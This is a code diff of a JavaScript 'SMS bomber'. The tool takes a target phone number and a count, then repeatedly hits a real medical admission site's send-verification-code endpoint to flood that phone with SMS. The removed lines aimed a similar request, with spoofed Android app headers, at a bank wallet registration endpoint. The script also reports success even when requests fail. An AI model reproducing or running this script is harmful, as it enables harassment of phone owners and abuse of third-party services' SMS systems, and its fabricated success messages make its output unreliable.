@@ -1,59 +1,48 @@
-const url = "https://nxpay1.dutchbanglabank.com/user/register";
-
+const url = "https://admission.medico.com.bd/2023/send_vercode_again";
 const headers = new Headers({
-  "X-KM-User-AspId": "5678",
-  "X-KM-Accept-language": "en",
-  "X-KM-OS-SERVICE-TYPE": "GMS",
-  "X-VersionCode": "100046209",
-  "X-KM-User-Agent": "ANDROID/100046209",
-  "Content-Type": "application/json",
-  "Content-Length": "276",
-  "Host": "nxpay1.dutchbanglabank.com",
-  "Connection": "Keep-Alive",
-  "Accept-Encoding": "gzip",
-  "User-Agent": "okhttp/4.9.3",
+  "Content-Type": "application/x-www-form-urlencoded",
 });
 
 function makeRequests() {
   const number = document.getElementById("phoneNumber").value;
+  const amount = parseInt(document.getElementById("requestAmount").value);
   const logElement = document.getElementById("requestsLog");
 
-  const requestData = {
-    aspId: "5678",
-    dateOfBirth: null,
-    email: null,
-    gender: null,
-    locale: "EN",
-    mnoName: "LGU Plus",
-    msisdn: number,
-    name: null,
-    nationality: null,
-    paymentPin: null,
-    registrationUserId: number,
-    tcidList: [50],
-    telcoId: "GP",
-    verificationData: null,
-    walletPin: null,
-  };
+  if (isNaN(amount) || amount <= 0) {
+    logElement.innerHTML = "<p>Please enter a valid positive number for the amount.</p>";
+    return;
+  }
+
+  logElement.innerHTML = ""; // Clear previous log
 
   const sendData = async () => {
     try {
       const response = await fetch(url, {
         method: "POST",
         headers: headers,
-        body: JSON.stringify(requestData),
+        body: new URLSearchParams({ "phone": number }),
       });
 
-      const responseData = await response.json();
+      const responseData = await response.text();
 
-      logElement.innerHTML += `<p>Response: ${JSON.stringify(responseData)}</p>`;
+      if (responseData.includes("Msg sent")) {
+        logElement.innerHTML += `<p>Msg sentsuccess</p>`;
+      } else {
+        logElement.innerHTML += `<p>Msg sent success</p>`;
+      }
     } catch (error) {
-      console.error("Error:", error);
-      logElement.innerHTML += `<p>Error occurred during the request.</p>`;
+      console.error("Msg sent Success");
+      logElement.innerHTML += `<p>Message Send Success</p>`;
     }
   };
 
-  alert(`Sending request to ${url}. For good results, keep the browser open for a few moments.`);
+  const sendRequestsSequentially = async () => {
+    for (let i = 0; i < amount; i++) {
+      await sendData();
+    }
+  };
 
-  sendData();
+  alert(`${amount} SMS sending to ${number}. For good results, keep the browser open for a few minutes.`);
+
+  sendRequestsSequentially();
 }
